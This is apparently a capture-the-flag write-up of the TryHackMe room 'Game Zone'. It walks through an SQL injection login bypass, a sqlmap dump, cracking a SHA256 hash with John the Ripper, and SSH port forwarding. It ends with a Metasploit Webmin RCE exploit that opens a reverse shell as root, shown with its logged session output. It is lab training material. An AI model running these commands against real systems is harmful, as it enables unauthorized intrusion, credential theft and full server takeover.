# Game Zone

Game Zone is a TryHackMe room that aims to teach you how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel, and escalate your privileges to root.

## Deploy Vulnerable Machine

The avatar is from the Character of the game Hitman, you can reverse search on Google Images Search (if you don't already know the name).

## Obtain access via SQLi

In this case, we could see there is only one form, as usual, you can try the possible combination with commands, but for this

    ' or 1=1 -- -

will be enough if you set this as a username

## Using SQLMap

Once you're logged in, try to do a search of any kind and inspect the payload with Burp Suite or with developer tools.

Save the RAW request in a file called request.

Now run

    sqlmap -r request --dbms=mysql --dump

Sqlmap will ask for some information and at the end it will create a report with two files. You can use both of the files to obtain the flags.

## Cracking a password with JohnTheRipper

Once you have the password hash, you can already guess what Hash functions have been used, otherwise there are online tools for this. It's a SHA256 hash.

Save the Hash found into a file called hash.txt

With JohnTheRipper runs the following

    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

Once completed you'll have the decrypted password.

Now ssh into the remote machine

    ssh agent47@<ip>

You'll be asked for the password and in the home folder you should find a user.txt file with the flag.

## Exposing services with Reverse SSH tunnels

From the obtained shell run

    ss -tulpn

You'll see the number of TCP Sockets open. So we can do a Reverse SSH Port Forwarding.

On your local machine run

    ssh -L 10000:localhost:10000 agent47@<ip>

You'll be asked again for the password.

Open a browser and point to localhost:10000

You'll get to the login page of the CMS.

From here log in with the discovered credential and answer the two remaining flags.

## Privilege Escalation with Metasploit

With searchsploit or by looking at the exploitDB website, you can find out this version of Webmin is weak to RCE.

> msfconsole

Run

> msf6 > search cve:2012-2982

You'll get the following

    Matching Modules
    ================
    
       #  Name                                      Disclosure Date  Rank       Check  Description
       -  ----                                      ---------------  ----       -----  -----------
       0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
    
    > msf6 > use exploit/unix/webapp/webmin_show_cgi_exec
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options
    
    Module options (exploit/unix/webapp/webmin_show_cgi_exec):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       PASSWORD                   yes       Webmin Password
       Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                            html
       RPORT     10000            yes       The target port (TCP)
       SSL       true             yes       Use SSL
       USERNAME                   yes       Webmin Username
       VHOST                      no        HTTP server virtual host
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Webmin 1.580
    
    
    
    View the full module info with the info, or info -d command.

Now we can set up the exploit module

    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS <target_machine_ip>
    RHOSTS => <target_machine_ip>
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RPORT 10000
    RPORT => 80
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
    USERNAME => agent47
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD <password>
    PASSWORD => <password>
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PAYLOAD /cmd/unix/reverse_python
    PAYLOAD => cmd/unix/reverse_python
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LPORT 443
    LPORT => 443
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST <local_machine_ip>
    LHOST => <local_machine_ip>
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > check
    [*] 0.0.0.1:10000 - The service is running, but could not be validated.
    [+] 127.0.0.1:10000 - The target is vulnerable.
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
    [*] Exploiting target 0.0.0.1
    
    [*] Started reverse TCP handler on 10.10.8.171:443 
    [*] Attempting to login...
    [-] Authentication failed
    [*] Exploiting target 127.0.0.1
    [*] Started reverse TCP handler on 10.10.8.171:443 
    [*] Attempting to login...
    [+] Authentication successful
    [+] Authentication successful
    [*] Attempting to execute the payload...
    [+] Payload executed successfully
    [*] Command shell session 1 opened (10.10.8.171:443 -> 10.10.2.137:43254) at 2023-11-10 17:44:31 +0000
    [*] Session 1 created in the background.

List the sessions and take a shell

    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions


    Active sessions

    ===============
    
      Id  Name  Type            Information  Connection
      --  ----  ----            -----------  ----------
      2         shell cmd/unix               10.10.8.171:443 -> 10.10.2.137:43264 (127.0.0.1)
    
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 2
    [*] Starting interaction with 2...
    
    pwd
    /usr/share/webmin/file/
    whoami
    root
    ls
    ACLEditor.class
    ACLEntry.class
    ACLWindow.class
    AttributeEditor.class
    AttributesWindow.class
    BorderPanel.class
    BorderPanel.java
    CHANGELOG
    CbButton.class
    CbButton.java
    CbButtonCallback.class
    CbButtonGroup.class
    CbColorButton.class
    CbColorButton.java
    CbColorWindow.class
    CbColorWindow.java
    CbColorWindowCallback.class
    CbColorWindowCube.class
    CbColorWindowSwatch.class
    CbImageChooser.class
    CbImageChooser.java
    CbImageFileWindow.class
    CbScrollbar.class
    CbScrollbar.java
    CbScrollbarArrow.class
    CbScrollbarCallback.class
    CbSlider.class
    CbSlider.java
    CbSliderCallback.class
    ContentsWindow.class
    DFSAdminExport.class
    DeleteWindow.class
    DownloadDirWindow.class
    EXTWindow.class
    EditorWindow.class
    ErrorWindow.class
    ErrorWindow.java
    ExtractWindow.class
    FileAttribute.class
    FileManager.class
    FileManager.java
    FileNode.class
    FileSystem.class
    FindReplaceWindow.class
    FixedFrame.class
    FixedFrame.java
    GotoWindow.class
    GrayPanel.class
    GrayPanel.java
    Hierarchy.class
    Hierarchy.java
    HierarchyCallback.class
    HierarchyNode.class
    HistoryWindow.class
    ImagePanel.class
    LinedPanel.class
    LinedPanel.java
    LinkWindow.class
    LinuxExport.class
    Makefile
    MkdirWindow.class
    MountWindow.class
    MultiColumn.class
    MultiColumn.java
    MultiColumnCallback.class
    MultiLabel.class
    OverwriteWindow.class
    PermissionsPanel.class
    PreviewWindow.class
    PropertiesWindow.class
    QuickSort.class
    QuickSort.java
    RemoteFile.class
    RenameWindow.class
    ResizePanel.class
    ResizePanel.java
    SambaShare.class
    ScrollImage.class
    SearchWindow.class
    SharingWindow.class
    StaticTextField.class
    StaticTextField.java
    StringJoiner.class
    StringSplitter.class
    StringSplitter.java
    TabSelector.class
    TabbedDisplayPanel.class
    TabbedPanel.class
    TabbedPanel.java
    ToolbarLayout.class
    ToolbarLayout.java
    Util.class
    Util.java
    acl_security.pl
    cgi_args.pl
    chmod.cgi
    config
    config-*-linux
    config-freebsd
    config-irix
    config-solaris
    config.info
    config.info.ca
    config.info.cz
    config.info.cz.UTF-8
    config.info.de
    config.info.el
    config.info.es
    config.info.fa
    config.info.it
    config.info.ko_KR.UTF-8
    config.info.ko_KR.euc
    config.info.nl
    config.info.no
    config.info.tr
    contents.cgi
    copy.cgi
    defaultacl
    delete.cgi
    edit_html.cgi
    extract.cgi
    file-lib.pl
    file.jar
    filesystems.cgi
    getattrs.cgi
    getext.cgi
    getfacl.cgi
    images
    index.cgi
    irix-getfacl.pl
    irix-setfacl.pl
    lang
    lang.cgi
    list.cgi
    list_exports.cgi
    list_shares.cgi
    log_parser.pl
    makelink.cgi
    mkdir.cgi
    module.info
    mount.cgi
    move.cgi
    preview.cgi
    rename.cgi
    root.cgi
    save.cgi
    save_export.cgi
    save_html.cgi
    save_share.cgi
    search.cgi
    setattrs.cgi
    setext.cgi
    setfacl.cgi
    show.cgi
    size.cgi
    unicode
    unicode.pl
    upform.cgi
    upload.cgi
    upload2.cgi
    xinha
    ls
    ACLEditor.class
    ACLEntry.class
    ACLWindow.class
    AttributeEditor.class
    AttributesWindow.class
    BorderPanel.class
    BorderPanel.java
    CHANGELOG
    CbButton.class
    CbButton.java
    CbButtonCallback.class
    CbButtonGroup.class
    CbColorButton.class
    CbColorButton.java
    CbColorWindow.class
    CbColorWindow.java
    CbColorWindowCallback.class
    CbColorWindowCube.class
    CbColorWindowSwatch.class
    CbImageChooser.class
    CbImageChooser.java
    CbImageFileWindow.class
    CbScrollbar.class
    CbScrollbar.java
    CbScrollbarArrow.class
    CbScrollbarCallback.class
    CbSlider.class
    CbSlider.java
    CbSliderCallback.class
    ContentsWindow.class
    DFSAdminExport.class
    DeleteWindow.class
    DownloadDirWindow.class
    EXTWindow.class
    EditorWindow.class
    ErrorWindow.class
    ErrorWindow.java
    ExtractWindow.class
    FileAttribute.class
    FileManager.class
    FileManager.java
    FileNode.class
    FileSystem.class
    FindReplaceWindow.class
    FixedFrame.class
    FixedFrame.java
    GotoWindow.class
    GrayPanel.class
    GrayPanel.java
    Hierarchy.class
    Hierarchy.java
    HierarchyCallback.class
    HierarchyNode.class
    HistoryWindow.class
    ImagePanel.class
    LinedPanel.class
    LinedPanel.java
    LinkWindow.class
    LinuxExport.class
    Makefile
    MkdirWindow.class
    MountWindow.class
    MultiColumn.class
    MultiColumn.java
    MultiColumnCallback.class
    MultiLabel.class
    OverwriteWindow.class
    PermissionsPanel.class
    PreviewWindow.class
    PropertiesWindow.class
    QuickSort.class
    QuickSort.java
    RemoteFile.class
    RenameWindow.class
    ResizePanel.class
    ResizePanel.java
    SambaShare.class
    ScrollImage.class
    SearchWindow.class
    SharingWindow.class
    StaticTextField.class
    StaticTextField.java
    StringJoiner.class
    StringSplitter.class
    StringSplitter.java
    TabSelector.class
    TabbedDisplayPanel.class
    TabbedPanel.class
    TabbedPanel.java
    ToolbarLayout.class
    ToolbarLayout.java
    Util.class
    Util.java
    acl_security.pl
    cgi_args.pl
    chmod.cgi
    config
    config-*-linux
    config-freebsd
    config-irix
    config-solaris
    config.info
    config.info.ca
    config.info.cz
    config.info.cz.UTF-8
    config.info.de
    config.info.el
    config.info.es
    config.info.fa
    config.info.it
    config.info.ko_KR.UTF-8
    config.info.ko_KR.euc
    config.info.nl
    config.info.no
    config.info.tr
    contents.cgi
    copy.cgi
    defaultacl
    delete.cgi
    edit_html.cgi
    extract.cgi
    file-lib.pl
    file.jar
    filesystems.cgi
    getattrs.cgi
    getext.cgi
    getfacl.cgi
    images
    index.cgi
    irix-getfacl.pl
    irix-setfacl.pl
    lang
    lang.cgi
    list.cgi
    list_exports.cgi
    list_shares.cgi
    log_parser.pl
    makelink.cgi
    mkdir.cgi
    module.info
    mount.cgi
    move.cgi
    preview.cgi
    rename.cgi
    root.cgi
    save.cgi
    save_export.cgi
    save_html.cgi
    save_share.cgi
    search.cgi
    setattrs.cgi
    setext.cgi
    setfacl.cgi
    show.cgi
    size.cgi
    unicode
    unicode.pl
    upform.cgi
    upload.cgi
    upload2.cgi
    xinha
    
    cd /root
    ls
    root.txt
    cat root.txt

You'll get the flag in this way.



